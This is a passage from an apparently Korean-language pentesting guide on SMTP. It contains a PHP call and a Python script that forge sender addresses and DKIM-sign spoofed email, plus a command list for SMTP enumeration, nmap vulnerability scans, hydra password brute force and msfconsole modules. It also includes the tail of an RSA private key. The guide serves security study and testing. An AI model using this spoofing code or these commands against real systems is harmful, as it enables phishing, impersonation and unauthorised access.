MIICXgIBAAKBgQDdkohAIWT6mXiHpfAHF8bv2vHTDboN2dl5pZKG5ZSHCYC5Z1bt
spr6chlrPUX71hfSkk8WxnJ1iC9Moa9sRzdjBrxPMjRDgP8p8AFdpugP5rJJXExO
pkZcdNPvCXGYNYD86Gpous6ubn6KhUWwDD1bw2UFu53nW/AK/EE4/jeraQIDAQAB
AoGAe31lrsht7TWH9aJISsu3torCaKyn23xlNuVO6xwdUb28Hpk327bFpXveKuS1
koxaLqQYrEriFBtYsU8T5Dc06FQAVLpUBOn+9PcKlxPBCLvUF+/KbfHF0q1QbeZR
fgr+E+fPxwVPxxk3i1AwCP4Cp1+bz2s58wZXlDBkWZ2YJwECQQD/f4bO2lnJz9Mq
1xsL3PqHlzIKh+W+yiGmQAELbgOdX4uCxMxjs5lwGSACMH2nUwXx+05RB8EM2m+j
ZBTeqxDxAkEA3gHyUtVenuTGClgYpiwefaTbGfYadh0z2KmiVcRqWzz3hDUEWxhc
GNtFT8wzLcmRHB4SQYUaS0Df9mpvwvdB+QJBALGv9Qci39L0j/15P7wOYMWvpwOf
422+kYxXcuKKDkWCTzoQt7yXCRzmvFYJdznJCZdymNLNu7q+p2lQjxsUiWECQQCI
Ms2FP91ywYs1oWJN39c84byBKtiFCdla3Ib48y0EmFyJQTVQ5ZrqrOrSz8W+G2Do
zRIKHCxLapt7w0SZabORAkEAxvm5pd2MNVqrqMJHbukHY1yBqwm5zVIYr75eiIDP
K9B7U1w0CJFUk6+4Qutr2ROqKtNOff9KuNRLAOiAzH3ZbQ==
-----END RSA PRIVATE KEY-----
```
{% endhint %}

**또는 수동으로 수행할 수도 있습니다:**

{% tabs %}
{% tab title="PHP" %}
<pre class="language-php"><code class="lang-php"><strong># 이렇게 하면 서명되지 않은 메시지가 전송됩니다.
</strong><strong>mail("your_email@gmail.com", "테스트 제목!", "안녕하세요! 이것은 테스트입니다.", "From: administrator@victim.com");
</strong></code></pre>
{% endtab %}

{% tab title="Python" %}
```python
# Code from https://github.com/magichk/magicspoofing/blob/main/magicspoofmail.py

import os
import dkim #pip3 install dkimpy
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase

# Set params
destination="destination@gmail.com"
sender="administrator@victim.com"
subject="Test"
message_html="""
<html>
<body>
<h3>This is a test, not a scam</h3>
<br />
</body>
</html>
"""
sender_domain=sender.split("@")[1]

# Prepare postfix
os.system("sudo sed -ri 's/(myhostname) = (.*)/\\1 = "+sender_domain+"/g' /etc/postfix/main.cf")
os.system("systemctl restart postfix")

# Generate DKIM keys
dkim_private_key_path="dkimprivatekey.pem"
os.system(f"openssl genrsa -out {dkim_private_key_path} 1024 2> /dev/null")
with open(dkim_private_key_path) as fh:
dkim_private_key = fh.read()

# Generate email
msg = MIMEMultipart("alternative")
msg.attach(MIMEText(message_html, "html"))
msg["To"] = destination
msg["From"] = sender
msg["Subject"] = subject
headers = [b"To", b"From", b"Subject"]
msg_data = msg.as_bytes()

# Sign email with dkim
## The receiver won't be able to check it, but the email will appear as signed (and therefore, more trusted)
dkim_selector="s1"
sig = dkim.sign(message=msg_data,selector=str(dkim_selector).encode(),domain=sender_domain.encode(),privkey=dkim_private_key.encode(),include_headers=headers)
msg["DKIM-Signature"] = sig[len("DKIM-Signature: ") :].decode()
msg_data = msg.as_bytes()

# Use local postfix relay to send email
smtp="127.0.0.1"
s = smtplib.SMTP(smtp)
s.sendmail(sender, [destination], msg_data)
```
{% endtab %}
{% endtabs %}

### **추가 정보**

**이러한 보호 기능에 대한 자세한 정보는** [**https://seanthegeek.net/459/demystifying-dmarc/**](https://seanthegeek.net/459/demystifying-dmarc/) **에서 찾을 수 있습니다.**

### **기타 피싱 지표**

* 도메인의 연령
* IP 주소를 가리키는 링크
* 링크 조작 기술
* 수상한 (일반적이지 않은) 첨부 파일
* 손상된 이메일 내용
* 메일 헤더와 다른 값 사용
* 유효하고 신뢰할 수 있는 SSL 인증서의 존재
* 웹 콘텐츠 필터링 사이트에 페이지 제출

## SMTP를 통한 데이터 유출

**SMTP를 통해 데이터를 전송할 수 있다면** [**여기를 읽어보세요**](../../generic-methodologies-and-resources/exfiltration.md#smtp)**.**

## 구성 파일

### Postfix

일반적으로, `/etc/postfix/master.cf`에는 사용자가 새로운 메일을 받을 때 실행되는 **스크립트**가 포함되어 있습니다. 예를 들어, `flags=Rq user=mark argv=/etc/postfix/filtering-f ${sender} -- ${recipient}`라는 줄은 사용자 mark가 새로운 메일을 받으면 `/etc/postfix/filtering`이 실행될 것을 의미합니다.

다른 구성 파일:
```
sendmail.cf
submit.cf
```
## 참고 자료
* [https://research.nccgroup.com/2015/06/10/username-enumeration-techniques-and-their-value/](https://research.nccgroup.com/2015/06/10/username-enumeration-techniques-and-their-value/)
* [https://www.reddit.com/r/HowToHack/comments/101it4u/what_could_hacker_do_with_misconfigured_smtp/](https://www.reddit.com/r/HowToHack/comments/101it4u/what_could_hacker_do_with_misconfigured_smtp/)

## HackTricks 자동 명령어
```
Protocol_Name: SMTP    #Protocol Abbreviation if there is one.
Port_Number:  25,465,587     #Comma separated if there is more than one.
Protocol_Description: Simple Mail Transfer Protocol          #Protocol Abbreviation Spelled out

Entry_1:
Name: Notes
Description: Notes for SMTP
Note: |
SMTP (Simple Mail Transfer Protocol) is a TCP/IP protocol used in sending and receiving e-mail. However, since it is limited in its ability to queue messages at the receiving end, it is usually used with one of two other protocols, POP3 or IMAP, that let the user save messages in a server mailbox and download them periodically from the server.

https://book.hacktricks.xyz/pentesting/pentesting-smtp

Entry_2:
Name: Banner Grab
Description: Grab SMTP Banner
Command: nc -vn {IP} 25

Entry_3:
Name: SMTP Vuln Scan
Description: SMTP Vuln Scan With Nmap
Command: nmap --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 {IP}

Entry_4:
Name: SMTP User Enum
Description: Enumerate uses with smtp-user-enum
Command: smtp-user-enum -M VRFY -U {Big_Userlist} -t {IP}

Entry_5:
Name: SMTPS Connect
Description: Attempt to connect to SMTPS two different ways
Command: openssl s_client -crlf -connect {IP}:465 &&&& openssl s_client -starttls smtp -crlf -connect {IP}:587

Entry_6:
Name: Find MX Servers
Description: Find MX servers of an organization
Command: dig +short mx {Domain_Name}

Entry_7:
Name: Hydra Brute Force
Description: Need Nothing
Command: hydra -P {Big_Passwordlist} {IP} smtp -V

Entry_8:
Name: consolesless mfs enumeration
Description: SMTP enumeration without the need to run msfconsole
Note: sourced from https://github.com/carlospolop/legion
Command: msfconsole -q -x 'use auxiliary/scanner/smtp/smtp_version; set RHOSTS {IP}; set RPORT 25; run; exit' && msfconsole -q -x 'use auxiliary/scanner/smtp/smtp_ntlm_domain; set RHOSTS {IP}; set RPORT 25; run; exit' && msfconsole -q -x 'use auxiliary/scanner/smtp/smtp_relay; set RHOSTS {IP}; set RPORT 25; run; exit'

```
<figure><img src="/.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

**취약성 평가 및 침투 테스트를 위한 즉시 사용 가능한 설정**. 리콘부터 보고서 작성까지 20개 이상의 도구와 기능으로 어디서든 전체 펜테스트를 실행하세요. 우리는 펜테스터를 대체하지 않습니다 - 대신, 펜테스터들에게 깊이 파고들고 쉘을 획득하며 즐길 시간을 돌려주기 위해 맞춤형 도구, 탐지 및 공격 모듈을 개발합니다.

{% embed url="https://pentest-tools.com/" %}
<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 제로부터 AWS 해킹을 전문가 수준까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* HackTricks에서 **회사 광고를 보거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 구매하세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)을 **팔로우**하세요.
* **HackTricks**와 **HackTricks Cloud** github 저장소에 PR을 제출하여 여러분의 해킹 기법을 공유하세요.

</details>
